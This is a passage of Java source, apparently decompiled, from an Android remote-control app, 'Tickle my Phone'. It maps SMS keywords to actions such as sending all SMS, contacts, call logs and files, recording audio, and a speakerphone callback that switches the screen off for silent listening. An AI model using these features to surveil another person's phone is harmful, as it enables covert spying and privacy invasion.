package com.jalsalabs.ticklemyphonefull;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.Activity;
import android.app.ActivityManager;
import android.app.ActivityManager.RunningServiceInfo;
import android.app.AlertDialog.Builder;
import android.app.PendingIntent;
import android.app.ProgressDialog;
import android.bluetooth.BluetoothAdapter;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.ContentProviderOperation;
import android.content.ContentProviderResult;
import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Context;
import android.content.DialogInterface;
import android.content.DialogInterface.OnClickListener;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.OperationApplicationException;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.content.pm.ProviderInfo;
import android.content.pm.ServiceInfo;
import android.content.res.AssetManager;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.graphics.Bitmap;
import android.graphics.Bitmap.CompressFormat;
import android.graphics.BitmapFactory;
import android.graphics.Canvas;
import android.graphics.Color;
import android.graphics.Paint;
import android.media.AudioManager;
import android.media.MediaPlayer;
import android.media.MediaRecorder;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.NetworkInfo.DetailedState;
import android.net.Uri;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Build.VERSION;
import android.os.Environment;
import android.os.RemoteException;
import android.os.StatFs;
import android.os.Vibrator;
import android.preference.PreferenceManager;
import android.provider.Browser;
import android.provider.CallLog.Calls;
import android.provider.ContactsContract.CommonDataKinds.Phone;
import android.provider.ContactsContract.Contacts;
import android.provider.ContactsContract.Data;
import android.provider.ContactsContract.PhoneLookup;
import android.provider.ContactsContract.RawContacts;
import android.provider.Settings.Secure;
import android.provider.Settings.System;
import android.telephony.CellLocation;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.text.Html;
import android.text.format.DateFormat;
import android.util.Log;
import android.view.WindowManager.LayoutParams;
import android.widget.EditText;
import android.widget.Toast;
import com.sun.mail.imap.IMAPStore;
import com.sun.mail.smtp.SMTPMessage;
import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;
import java.net.UnknownHostException;
import java.security.InvalidKeyException;
import java.security.Key;
import java.sql.Date;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.List;
import java.util.Random;
import java.util.StringTokenizer;
import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.KeyGenerator;
import javax.mail.internet.AddressException;
import javax.mail.internet.InternetAddress;
//import org.apache.http.util.ByteArrayBuffer;
import org.apache.http.util.*;

public class TML_Library {
    public static String APPTYPE = "FULL";
    public static String APP_FULL_VERSION = "Tickle my Phone Version 5.0.0";
    public static String APP_NAME = "Tickle my Phone(True Remote)";
    public static boolean DEBUG = false;
    public static String DESKTOP_MARKET_URL = "http://market.android.com/details?id=com.jalsalabs.ticklemyphonefull";
    public static String DESKTOP_MARKET_URL_FULL = "http://market.android.com/details?id=com.jalsalabs.ticklemyphonefull";
    public static String ISFREE = "N";
    public static ProgressDialog LoadingProgressDialog;
    public static boolean MARKET_VERSION = true;
    public static String MOBILE_MARKET_URL = "market://details?id=com.jalsalabs.ticklemyphonefull";
    public static String MOBILE_MARKET_URL_FULL = "market://details?id=com.jalsalabs.ticklemyphonefull";
    public static String PACKAGE_FULL_NAME = "com.jalsalabs.ticklemyphonefull";
    public static long REPEAT_FREQUENCY = 86400000;
    public static String[] SmsDetails = new String[]{"UNDEFINED", "UNDEFINED", "UNDEFINED", "UNDEFINED", "UNDEFINED", "UNDEFINED", "UNDEFINED", "UNDEFINED", "UNDEFINED", "UNDEFINED", "UNDEFINED", "UNDEFINED", "UNDEFINED", "UNDEFINED", "UNDEFINED", "UNDEFINED", "UNDEFINED", "UNDEFINED", "UNDEFINED", "UNDEFINED", "UNDEFINED", "UNDEFINED"};
    public static String VERSION = "5.0.0";
    private static String algorithm = "DESede";
    private static Cipher cipher = null;
    private static Key key = null;

    public static void SetParameter(String StringCode, String StringValue) {
        if (StringCode.equals("ORIGINAL_ADDRESS")) {
            SmsDetails[0] = StringValue;
        } else if (StringCode.equals("SENDER_CONTACT_NAME")) {
            SmsDetails[1] = StringValue;
        } else if (StringCode.equals("SERVICE_CENTER_ADDRESS")) {
            SmsDetails[2] = StringValue;
        } else if (StringCode.equals("SMS_RECEIVED_STATUS")) {
            SmsDetails[3] = StringValue;
        } else if (StringCode.equals("PROTOCOL_IDENTIFER")) {
            SmsDetails[4] = StringValue;
        } else if (StringCode.equals("STATUS_ON_ICC")) {
            SmsDetails[5] = StringValue;
        } else if (StringCode.equals("MESSAGE_BODY")) {
            SmsDetails[6] = StringValue;
        } else if (StringCode.equals("SERVER_TIMESTAMP_MILLIS")) {
            SmsDetails[7] = StringValue;
        } else if (StringCode.equals("BODY2NDTOKEN")) {
            SmsDetails[8] = StringValue;
        } else if (StringCode.equals("RULE_OPTION")) {
            SmsDetails[9] = StringValue;
        } else if (StringCode.equals("BATTERY_LEVEL")) {
            SmsDetails[10] = StringValue;
        } else if (StringCode.equals("AUDIO_SELECTION")) {
            SmsDetails[11] = StringValue;
        } else if (StringCode.equals("ACTION_SELECTED")) {
            SmsDetails[12] = StringValue;
        } else if (StringCode.equals("INCOMING_COUNT")) {
            SmsDetails[13] = StringValue;
        } else if (StringCode.equals("OUTGOING_COUNT")) {
            SmsDetails[14] = StringValue;
        } else if (StringCode.equals("MISSCALL_COUNT")) {
            SmsDetails[15] = StringValue;
        } else if (StringCode.equals("CONTACT_COUNT")) {
            SmsDetails[16] = StringValue;
        } else if (StringCode.equals("TEMPMESSAGE")) {
            SmsDetails[17] = StringValue;
        } else if (StringCode.equals("ACTIVITY_TO_CALL")) {
            SmsDetails[18] = StringValue;
        }
    }

    public static String GetParameter(String StringCode) {
        if (StringCode.equals("ORIGINAL_ADDRESS")) {
            return SmsDetails[0];
        }
        if (StringCode.equals("SENDER_CONTACT_NAME")) {
            return SmsDetails[1];
        }
        if (StringCode.equals("SERVICE_CENTER_ADDRESS")) {
            return SmsDetails[2];
        }
        if (StringCode.equals("SMS_RECEIVED_STATUS")) {
            return SmsDetails[3];
        }
        if (StringCode.equals("PROTOCOL_IDENTIFER")) {
            return SmsDetails[4];
        }
        if (StringCode.equals("STATUS_ON_ICC")) {
            return SmsDetails[5];
        }
        if (StringCode.equals("MESSAGE_BODY")) {
            return SmsDetails[6];
        }
        if (StringCode.equals("SERVER_TIMESTAMP_MILLIS")) {
            return SmsDetails[7];
        }
        if (StringCode.equals("BODY2NDTOKEN")) {
            return SmsDetails[8];
        }
        if (StringCode.equals("RULE_OPTION")) {
            return SmsDetails[9];
        }
        if (StringCode.equals("BATTERY_LEVEL")) {
            return SmsDetails[10];
        }
        if (StringCode.equals("AUDIO_SELECTION")) {
            return SmsDetails[11];
        }
        if (StringCode.equals("ACTION_SELECTED")) {
            return SmsDetails[12];
        }
        if (StringCode.equals("INCOMING_COUNT")) {
            return SmsDetails[13];
        }
        if (StringCode.equals("OUTGOING_COUNT")) {
            return SmsDetails[14];
        }
        if (StringCode.equals("MISSCALL_COUNT")) {
            return SmsDetails[15];
        }
        if (StringCode.equals("CONTACT_COUNT")) {
            return SmsDetails[16];
        }
        if (StringCode.equals("TEMPMESSAGE")) {
            return SmsDetails[17];
        }
        if (StringCode.equals("ACTIVITY_TO_CALL")) {
            return SmsDetails[18];
        }
        return "NOT DECLARED";
    }

    public static String getMethodName(int depth) {
        StackTraceElement[] ste = Thread.currentThread().getStackTrace();
        return ste[(ste.length - 1) - depth].getMethodName();
    }

    public static void Debug(String PS_Message) {
        if (DEBUG) {
            String LS_Date = GetDateFormat("dd MMMMM yyyy");
            Log.d(getMethodName(1) , new StringBuilder(String.valueOf(LS_Date)).append("-").append(GetDateFormat("h:mm:ss a")).append(" ->").append(PS_Message).toString());
        }
    }

    public static String getTMLPath() {
        return new StringBuilder(String.valueOf(Environment.getExternalStorageDirectory().getPath())).append("/ticklemyphone/").toString();
    }

    public static void Error(String PS_Message) {
    }

    public static void Info(String PS_Message) {
    }

    public static void Warning(String PS_Message) {
    }

    public static String GetDateFormat(String dateFormat) {
        return new SimpleDateFormat(dateFormat).format(Calendar.getInstance().getTime());
    }

    public static void DownloadFromUrl(String imageURL, String fileName) {
        try {
            URL url = new URL(imageURL);
            File file = new File(fileName);
            long startTime = System.currentTimeMillis();
            Debug("download begining url :" + url);
            Debug("download begining file name :" + fileName);
            BufferedInputStream bis = new BufferedInputStream(url.openConnection().getInputStream());
            ByteArrayBuffer baf = new ByteArrayBuffer(50);
            while (true) {
                int current = bis.read();
                if (current == -1) {
                    FileOutputStream fos = new FileOutputStream(file);
                    fos.write(baf.toByteArray());
                    fos.close();
                    Debug("download ready in" + ((System.currentTimeMillis() - startTime) / 1000) + " sec");
                    return;
                }
                baf.append((byte) current);
            }
        } catch (IOException e) {
            Debug("Image *****Error :" + e);
        }
    }

    public static boolean fileExists(Context context, String f) {
        if (new File(f).exists()) {
            return true;
        }
        return false;
    }

    public static void PutToast(Context content, String message) {
        Toast toast = Toast.makeText(content.getApplicationContext(), message, 1);
        toast.setGravity(80, 0, 0);
        toast.show();
    }

    public static String HaveWhatTypeNetworkConnection(Context cntxt) {
        String HaveConnectedWifi = "N";
        String HaveConnectedMobile = "N";
        for (NetworkInfo ni : ((ConnectivityManager) cntxt.getSystemService("connectivity")).getAllNetworkInfo()) {
            Debug("Network Type = " + ni.getTypeName());
            if (ni.getTypeName().equalsIgnoreCase("WIFI") && ni.isConnected()) {
                Debug("WIFI is Okay");
                HaveConnectedWifi = "Y";
            }
            if (ni.getTypeName().equalsIgnoreCase("MOBILE") && ni.isConnected()) {
                Debug("Mobile is Okay");
                HaveConnectedMobile = "Y";
            }
        }
        return new StringBuilder(String.valueOf(HaveConnectedWifi)).append(HaveConnectedMobile).toString();
    }

    public static boolean isNetworkAvailable(Context cntxt) {
        return ((ConnectivityManager) cntxt.getSystemService("connectivity")).getActiveNetworkInfo() != null;
    }

    public static String getUniqueId(Context context) {
        return Secure.getString(context.getContentResolver(), "android_id");
    }

    public static void CallBackNumber(Context context, String num, Boolean speaker) {
        Debug("***************Inside CallBack and calling number" + num);
        Intent intent = new Intent("android.intent.action.CALL");
        intent.setFlags(268435456);
        intent.setData(Uri.parse("tel:" + num));
        context.startActivity(intent);
        if (speaker.booleanValue()) {
            AudioManager audioManager = (AudioManager) context.getSystemService("audio");
            if (!audioManager.isSpeakerphoneOn()) {
                audioManager.setSpeakerphoneOn(true);
            }
            audioManager.setSpeakerphoneOn(true);
            Sleep(2);
            if (!audioManager.isSpeakerphoneOn()) {
                audioManager.setSpeakerphoneOn(true);
            }
            SwitchOfftheScreen(context);
        }
        if (GetPref(context, "KEY_IS_APP_ACTIVATE").equals("N")) {
            Debug("Just sleeping for 5 seconds");
            Sleep(20);
            Debug("Just slept 20 seconds");
            Debug("Now disconnecting the call");
            System.putInt(context.getContentResolver(), "airplane_mode_on", 1);
            Intent intentx = new Intent("android.intent.action.AIRPLANE_MODE");
            intentx.putExtra("state", 1);
            context.sendBroadcast(intentx);
            Sleep(2);
            System.putInt(context.getContentResolver(), "airplane_mode_on", 0);
            Intent intenty = new Intent("android.intent.action.AIRPLANE_MODE");
            intenty.putExtra("state", 0);
            context.sendBroadcast(intenty);
        }
    }

    public static String Get1stToken(String Body) {
        StringTokenizer stringTokenizer = new StringTokenizer(Body);
        Debug("The total no. of tokens   generated :  " + stringTokenizer.countTokens());
        int i = 0;
        String ls_1sttoken = "";
        while (stringTokenizer.hasMoreTokens()) {
            String ls_token = stringTokenizer.nextToken();
            Debug("**********LS Token  " + ls_token);
            i++;
            if (i == 1) {
                ls_1sttoken = new StringBuilder(String.valueOf(ls_1sttoken)).append(ls_token).toString();
            }
        }
        return ls_1sttoken;
    }

    public static String Get2ndToken(String Body) {
        StringTokenizer stringTokenizer = new StringTokenizer(Body);
        Debug("The total no. of tokens   generated :  " + stringTokenizer.countTokens());
        int i = 0;
        String ls_2ndtoken = "";
        while (stringTokenizer.hasMoreTokens()) {
            String ls_token = stringTokenizer.nextToken();
            Debug("**********LS Token  " + ls_token);
            i++;
            if (i == 2) {
                ls_2ndtoken = new StringBuilder(String.valueOf(ls_2ndtoken)).append(ls_token).toString();
            }
        }
        return ls_2ndtoken;
    }

    public static String GetAfter2Token(String Body) {
        StringTokenizer stringTokenizer = new StringTokenizer(Body);
        Debug("The total no. of tokens   generated :  " + stringTokenizer.countTokens());
        int i = 0;
        String ls_alltoken = "";
        while (stringTokenizer.hasMoreTokens()) {
            String ls_token = stringTokenizer.nextToken();
            Debug("i=" + i + " **********LS Token  " + ls_token);
            i++;
            if (i > 2) {
                ls_alltoken = new StringBuilder(String.valueOf(ls_alltoken)).append(ls_token).append(" ").toString();
            }
        }
        return ls_alltoken;
    }

    public static String GetAfter1Token(String Body) {
        StringTokenizer stringTokenizer = new StringTokenizer(Body);
        Debug("The total no. of tokens   generated :  " + stringTokenizer.countTokens());
        int i = 0;
        String ls_alltoken = "";
        while (stringTokenizer.hasMoreTokens()) {
            String ls_token = stringTokenizer.nextToken();
            Debug("i=" + i + " **********LS Token  " + ls_token);
            i++;
            if (i > 1) {
                ls_alltoken = new StringBuilder(String.valueOf(ls_alltoken)).append(ls_token).append(" ").toString();
            }
        }
        return ls_alltoken;
    }

    public static String GetMessageAfter2nd(String Body) {
        return Body.substring(Body.indexOf(" ", 10));
    }

    private static Object indexOf(String string, int i) {
        return null;
    }

    public static void Sleep(int Seconds) {
        try {
            Thread.sleep((long) (Seconds * IMAPStore.RESPONSE));
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }

    public static void SleepMilliseconds(long Seconds) {
        try {
            Thread.sleep(Seconds);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }

    public static String TmlEncrypt(String text) {
        try {
            return ChoomMantraGaali.encode(text.substring(4, 6) + "T" + text.substring(1, 2) + "mL" + text.substring(7, 9)).toLowerCase().replace('=', 'x').trim();
        } catch (Exception e) {
            return "@#$%%$#@";
        }
    }

    public static void ShowActivateFullVersionX(Context context) {
        if (GetPref(context, "KEY_IS_APP_ACTIVATE").equals("N")) {
            Builder adb = new Builder(context);
            adb.setTitle("Tickle my Phone");
            adb.setMessage("You are using Trial version.  Do you want to upgrade to full version?");
            adb.setPositiveButton("Ok :)", new OnClickListener() {
                public void onClick(DialogInterface dialog, int id) {
                }
            });
            adb.setNegativeButton("Sorry i dont have money :(", new OnClickListener() {
                public void onClick(DialogInterface dialog, int id) {
                    dialog.cancel();
                }
            });
            adb.setIcon(R.drawable.icon);
            adb.show();
        }
    }

    public static void ShowWantFullVersion(Context context) {
        final Context contextt = context;
        if (GetPref(context, "KEY_IS_FREE").equals("Y")) {
            Builder adb = new Builder(context);
            adb.setTitle("Tickle my Phone");
            adb.setMessage("You are using Free version.  Changes done to the Rules/Settings will not be saved.  Please consider bying  full version.");
            adb.setPositiveButton("Ok. Show me what Full Version has..", new OnClickListener() {
                public void onClick(DialogInterface dialog, int id) {
                    TML_Library.OpenMarketWindow(contextt);
                }
            });
            adb.setNegativeButton("Will see later", new OnClickListener() {
                public void onClick(DialogInterface dialog, int id) {
                    dialog.cancel();
                }
            });
            adb.setIcon(R.drawable.newruleon);
            adb.show();
        }
    }

    public static void SetPref(Context cntxt, String key, String value) {
        Editor editor = PreferenceManager.getDefaultSharedPreferences(cntxt).edit();
        editor.putString(key, value.trim());
        editor.commit();
    }

    public static void SetPrefPrivacyStealth(Context cntxt, String key, String value) {
        SharedPreferences app_preferences = PreferenceManager.getDefaultSharedPreferences(cntxt);
        Editor prefEdit;
        if (value.equals("true")) {
            prefEdit = app_preferences.edit();
            prefEdit.putBoolean(key, true);
            prefEdit.commit();
        } else if (value.equals("false")) {
            prefEdit = app_preferences.edit();
            prefEdit.putBoolean(key, false);
            prefEdit.commit();
        } else {
            Editor editor = app_preferences.edit();
            editor.putString(key, value);
            editor.commit();
        }
    }

    public static String GetprefnoAT(Context cntxt, String key) {
        String retvalue = GetPref(cntxt, key);
        if (retvalue.equals("@")) {
            return "";
        }
        return retvalue;
    }

    public static String GetPref(Context cntxt, String key) {
        String LS_Out = PreferenceManager.getDefaultSharedPreferences(cntxt).getString(key, "@");
        if (!LS_Out.equals("@")) {
            return LS_Out.trim();
        }
        if (key.equals("KEY_POPOUT")) {
            LS_Out = "POPPOUT";
        } else if (key.equals("KEY_POPOUT_ENABLE")) {
            LS_Out = "Y";
        } else if (key.equals("KEY_VIBRATE")) {
            LS_Out = "VIBRATEE";
        } else if (key.equals("KEY_VIBRATE_ENABLE")) {
            LS_Out = "Y";
        } else if (key.equals("KEY_VIBRATEN")) {
            LS_Out = "VIBRATENSEC";
        } else if (key.equals("KEY_VIBRATEN_ENABLE")) {
            LS_Out = "Y";
        } else if (key.equals("KEY_RINGTONE")) {
            LS_Out = "DEFRINGTONE";
        } else if (key.equals("KEY_RINGTONE_ENABLE")) {
            LS_Out = "Y";
        } else if (key.equals("KEY_SMS_REPLY")) {
            LS_Out = "SMSACKNOWLEDGE";
        } else if (key.equals("KEY_SMS_REPLY_TEXT")) {
            LS_Out = "Tickle my Phone Rocks.";
        } else if (key.equals("KEY_SMS_AC_REPLY_TEXT")) {
            LS_Out = "Dear $friendname, i have added your no $friendno to my contact list.  Please add mine.  My no is 00000\n Thanks -XXXXXX";
        } else if (key.equals("KEY_SMS_REPLY_ENABLE")) {
            LS_Out = "Y";
        } else if (key.equals("KEY_CALLBACK")) {
            LS_Out = "CALLMEBACK";
        } else if (key.equals("KEY_CALLBACK_ENABLE")) {
            LS_Out = "Y";
        } else if (key.equals("KEY_CALLBACK_SPEAKER")) {
            LS_Out = "CALLBACKSPEAKER";
        } else if (key.equals("KEY_CALLBACK_SPEAKER_ENABLE")) {
            LS_Out = "Y";
        } else if (key.equals("KEY_CALLFORWARD")) {
            LS_Out = "CALLNUMBER";
        } else if (key.equals("KEY_CALLFORWARD_ENABLE")) {
            LS_Out = "Y";
        } else if (key.equals("KEY_CALLFORWARD_SPEAKER")) {
            LS_Out = "CALLNUMBERSPEAKER";
        } else if (key.equals("KEY_CALLFORWARD_SPEAKER_ENABLE")) {
            LS_Out = "Y";
        } else if (key.equals("KEY_GEOSMS")) {
            LS_Out = "WHEREAREYOU";
        } else if (key.equals("KEY_GEOSMS_ENABLE")) {
            LS_Out = "Y";
        } else if (key.equals("KEY_SENDPHOTO")) {
            LS_Out = "SENDPHOTO";
        } else if (key.equals("KEY_SENDPHOTO_ENABLE")) {
            LS_Out = "Y";
        } else if (key.equals("KEY_SENDVIDEO")) {
            LS_Out = "SENDLIVEVIDEO";
        } else if (key.equals("KEY_SENDVIDEO_ENABLE")) {
            LS_Out = "Y";
        } else if (key.equals("KEY_SETGPS")) {
            LS_Out = "SETGPS";
        } else if (key.equals("KEY_SETGPS_ENABLE")) {
            LS_Out = "Y";
        } else if (key.equals("KEY_SETWIFI")) {
            LS_Out = "SETWIFI";
        } else if (key.equals("KEY_SETWIFI_ENABLE")) {
            LS_Out = "Y";
        } else if (key.equals("KEY_SENDHELP")) {
            LS_Out = "TMLHELP";
        } else if (key.equals("KEY_SENDHELP_ENABLE")) {
            LS_Out = "Y";
        } else if (key.equals("KEY_SENDMOBILEINFO")) {
            LS_Out = "SENDMOBILEINFO";
        } else if (key.equals("KEY_SENDMOBILEINFO_ENABLE")) {
            LS_Out = "Y";
        } else if (key.equals("KEY_SENDMISSCALLDETAIL")) {
            LS_Out = "SENDCALLLOG";
        } else if (key.equals("KEY_SENDMISSCALLDETAIL_ENABLE")) {
            LS_Out = "Y";
        } else if (key.equals("KEY_SAVEPHOTOSDCARD")) {
            LS_Out = "TAKEPICTURE";
        } else if (key.equals("KEY_SAVEPHOTOSDCARD_ENABLE")) {
            LS_Out = "Y";
        } else if (key.equals("KEY_RECORDAUDIO")) {
            LS_Out = "RECORDAUDIO";
        } else if (key.equals("KEY_RECORDAUDIO_ENABLE")) {
            LS_Out = "Y";
        } else if (key.equals("KEY_RECORDAUDIO_NSEC")) {
            LS_Out = "AUDIORECORDNSEC";
        } else if (key.equals("KEY_RECORDAUDIO_NSEC_ENABLE")) {
            LS_Out = "Y";
        } else if (key.equals("KEY_SENDAUDIORECORD")) {
            LS_Out = "SENDAUDIORECORD";
        } else if (key.equals("KEY_SENDAUDIORECORD_ENABLE")) {
            LS_Out = "Y";
        } else if (key.equals("KEY_BUZZMOBILE")) {
            LS_Out = "BUZZMYMOBILE";
        } else if (key.equals("KEY_BUZZMOBILE_ENABLE")) {
            LS_Out = "Y";
        } else if (key.equals("KEY_CALEVENT")) {
            LS_Out = "CALEVENT";
        } else if (key.equals("KEY_CALEVENT_ENABLE")) {
            LS_Out = "Y";
        } else if (key.equals("KEY_CONTACTLIST")) {
            LS_Out = "SENDCONTACTLIST";
        } else if (key.equals("KEY_CONTACTLIST_ENABLE")) {
            LS_Out = "Y";
        } else if (key.equals("KEY_GETSMS")) {
            LS_Out = "SENDALLSMS";
        } else if (key.equals("KEY_GETSMS_ENABLE")) {
            LS_Out = "Y";
        } else if (key.equals("KEY_GETAPPLIST")) {
            LS_Out = "SENDAPPLIST";
        } else if (key.equals("KEY_GETAPPLIST_ENABLE")) {
            LS_Out = "Y";
        } else if (key.equals("KEY_GETDIRLIST")) {
            LS_Out = "SENDFILELIST";
        } else if (key.equals("KEY_GETDIRLIST_ENABLE")) {
            LS_Out = "Y";
        } else if (key.equals("KEY_GETFILE")) {
            LS_Out = "GETFILE";
        } else if (key.equals("KEY_GETFILE_ENABLE")) {
            LS_Out = "Y";
        } else if (key.equals("KEY_PLAY_FILE")) {
            LS_Out = "PLAYFILE";
        } else if (key.equals("KEY_PLAY_FILE_ENABLE")) {
            LS_Out = "Y";
        } else if (key.equals("KEY_NETWORKDATA")) {
            LS_Out = "SETNETWORKDATA";
        } else if (key.equals("KEY_NETWORKDATA_ENABLE")) {
            LS_Out = "Y";
        } else if (key.equals("KEY_ADDCONTACT")) {
            LS_Out = "AC";
        } else if (key.equals("KEY_ADDCONTACT_ENABLE")) {
            LS_Out = "Y";
        } else if (key.equals("KEY_FIRST_TIME")) {
            LS_Out = "Y";
        } else if (key.equals("KEY_BLUETOOTH")) {
            LS_Out = "SETBLUETOOTH";
        } else if (key.equals("KEY_BLUETOOTH_ENABLE")) {
            LS_Out = "Y";
        } else if (key.equals("KEY_SMSREPORT")) {
            LS_Out = "SENDSMSREPORT";
        } else if (key.equals("KEY_SMSREPORT_ENABLE")) {
            LS_Out = "Y";
        } else if (key.equals("KEY_CALLREPORT")) {
            LS_Out = "SENDCALLREPORT";
        } else if (key.equals("KEY_CALLREPORT_ENABLE")) {
            LS_Out = "Y";
        } else if (key.equals("KEY_CONTACTLIST_ENABLE")) {
            LS_Out = "Y";
        } else if (key.equals("KEY_IS_APP_ACTIVATE")) {
            LS_Out = "Y";
        } else if (key.equals("KEY_ALLOW_DISALLOW")) {
            LS_Out = "DISALLOW";
        } else if (key.equals("KEY_NUMBERS_STRING")) {
            LS_Out = "";
        } else if (key.equals("KEY_IS_FREE")) {
            LS_Out = "Y";
        } else if (key.equals("DEFAULT_PHONE_LOST_TEXT")) {
            LS_Out = "Hi,\nI have lost this phone.\nThis Phone Belongs to XXXXXXXX.\nPlease  contact me at my alterenative number : XXXXXXXXXXXXXX\nOr return to following address. XXXXX\nXXXXXXXXXX\nXXXXXXXXXX.  \nThanks & Regards\n Your Name";
        }
        return LS_Out.trim();
    }

    public static String fn_DateFormat(String dateFormat) {
        return new SimpleDateFormat(dateFormat).format(Calendar.getInstance().getTime());
    }

    public static String GetHelp(Context context) {
        String LS_PopOut = GetPref(context, "KEY_POPOUT");
        String LS_PopOutEnable = GetPref(context, "KEY_POPOUT_ENABLE");
        String LS_Vibrate = GetPref(context, "KEY_VIBRATE");
        String LS_VibrateEnable = GetPref(context, "KEY_VIBRATE_ENABLE");
        String LS_VibrateN = GetPref(context, "KEY_VIBRATEN");
        String LS_VibrateNEnable = GetPref(context, "KEY_VIBRATEN_ENABLE");
        String LS_RingTone = GetPref(context, "KEY_RINGTONE");
        String LS_RingToneEnable = GetPref(context, "KEY_RINGTONE_ENABLE");
        LS_RingTone = GetPref(context, "KEY_RINGTONE");
        String LS_SMSReply = GetPref(context, "KEY_SMS_REPLY");
        String LS_SMSReplyEnable = GetPref(context, "KEY_SMS_REPLY_ENABLE");
        String LS_CallBack = GetPref(context, "KEY_CALLBACK");
        String LS_CallBackEnable = GetPref(context, "KEY_CALLBACK_ENABLE");
        String LS_CallBackSpeaker = GetPref(context, "KEY_CALLBACK_SPEAKER");
        String LS_CallBackSpeakerEnable = GetPref(context, "KEY_CALLBACK_SPEAKER_ENABLE");
        String LS_CallForward = GetPref(context, "KEY_CALLFORWARD");
        String LS_CallForwardEnable = GetPref(context, "KEY_CALLFORWARD_ENABLE");
        String LS_CallForwardSpeaker = GetPref(context, "KEY_CALLFORWARD_SPEAKER");
        String LS_CallForwardSpeakerEnable = GetPref(context, "KEY_CALLFORWARD_SPEAKER_ENABLE");
        String LS_GeoSms = GetPref(context, "KEY_GEOSMS");
        String LS_GeoSmsEnable = GetPref(context, "KEY_GEOSMS_ENABLE");
        String LS_SendPhoto = GetPref(context, "KEY_SENDPHOTO");
        String LS_SendPhotoEnable = GetPref(context, "KEY_SENDPHOTO_ENABLE");
        String LS_SendVideo = GetPref(context, "KEY_SENDVIDEO");
        String LS_SendVideoEnable = GetPref(context, "KEY_SENDVIDEO_ENABLE");
        String LS_SetGPS = GetPref(context, "KEY_SETGPS");
        String LS_SetGPSEnable = GetPref(context, "KEY_SETGPS_ENABLE");
        String LS_SetWifi = GetPref(context, "KEY_SETWIFI");
        String LS_SetWifiEnable = GetPref(context, "KEY_SETWIFI_ENABLE");
        String LS_SendHelp = GetPref(context, "KEY_SENDHELP");
        String LS_SendHelpEnable = GetPref(context, "KEY_SENDHELP_ENABLE");
        String LS_SendMobileInfo = GetPref(context, "KEY_SENDMOBILEINFO");
        String LS_SendMobileInfoEnable = GetPref(context, "KEY_SENDMOBILEINFO_ENABLE");
        String LS_SendMissCallDetail = GetPref(context, "KEY_SENDMISSCALLDETAIL");
        String LS_SendMissCallDetailEnable = GetPref(context, "KEY_SENDMISSCALLDETAIL_ENABLE");
        String LS_SavePhotoSDCard = GetPref(context, "KEY_SAVEPHOTOSDCARD");
        String LS_SavePhotoSDCardEnable = GetPref(context, "KEY_SAVEPHOTOSDCARD_ENABLE");
        String LS_RecordAudio = GetPref(context, "KEY_RECORDAUDIO");
        String LS_RecordAudioEnable = GetPref(context, "KEY_RECORDAUDIO_ENABLE");
        String LS_RecordAudioNSec = GetPref(context, "KEY_RECORDAUDIO_NSEC");
        String LS_RecordAudioNSecEnable = GetPref(context, "KEY_RECORDAUDIO_NSEC_ENABLE");
        String LS_SendRAudioRecord = GetPref(context, "KEY_SENDAUDIORECORD");
        String LS_SendRAudioRecordEnable = GetPref(context, "KEY_SENDAUDIORECORD_ENABLE");
        String LS_BuzzMobile = GetPref(context, "KEY_BUZZMOBILE");
        String LS_BuzzMobileEnable = GetPref(context, "KEY_BUZZMOBILE_ENABLE");
        String LS_CalEvent = GetPref(context, "KEY_CALEVENT");
        String LS_CalEventEnable = GetPref(context, "KEY_CALEVENT_ENABLE");
        String LS_ContactList = GetPref(context, "KEY_CONTACTLIST");
        String LS_ContactListEnable = GetPref(context, "KEY_CONTACTLIST_ENABLE");
        String LS_Get_Sms = GetPref(context, "KEY_GETSMS");
        String LS_Get_SmsEnable = GetPref(context, "KEY_GETSMS_ENABLE");
        String LS_Get_Applist = GetPref(context, "KEY_GETAPPLIST");
        String LS_Get_Applist_Enable = GetPref(context, "KEY_GETAPPLIST_ENABLE");
        String LS_Get_DirList = GetPref(context, "KEY_GETDIRLIST");
        String LS_Get_DirListEnable = GetPref(context, "KEY_GETDIRLIST_ENABLE");
        String LS_Get_File = GetPref(context, "KEY_GETFILE");
        String LS_Get_FileEnable = GetPref(context, "KEY_GETFILE_ENABLE");
        String LS_Play_File = GetPref(context, "KEY_PLAY_FILE");
        String LS_Play_FileEnable = GetPref(context, "KEY_PLAY_FILE_ENABLE");
        String LS_SetNetworkData = GetPref(context, "KEY_NETWORKDATA");
        String LS_SetNetworkDataEnable = GetPref(context, "KEY_NETWORKDATA_ENABLE");
        String LS_AddContact = GetPref(context, "KEY_ADDCONTACT");
        String LS_AddContactEnable = GetPref(context, "KEY_ADDCONTACT_ENABLE");
        String LS_SetBluetooth = GetPref(context, "KEY_BLUETOOTH");
        String LS_SetBluetoothEnable = GetPref(context, "KEY_BLUETOOTH_ENABLE");
        String LS_SendSMSReport = GetPref(context, "KEY_SMSREPORT");
        String LS_SendSMSReportEnable = GetPref(context, "KEY_SMSREPORT_ENABLE");
        String LS_SendCallReport = GetPref(context, "KEY_CALLREPORT");
        String LS_SendCallReportEnable = GetPref(context, "KEY_CALLREPORT_ENABLE");
        String LS_Set1 = GetPref(context, "KEY_SET1");
        String LS_Set1Enable = GetPref(context, "KEY_SET1_ENABLE");
        String LS_Set2 = GetPref(context, "KEY_SET2");
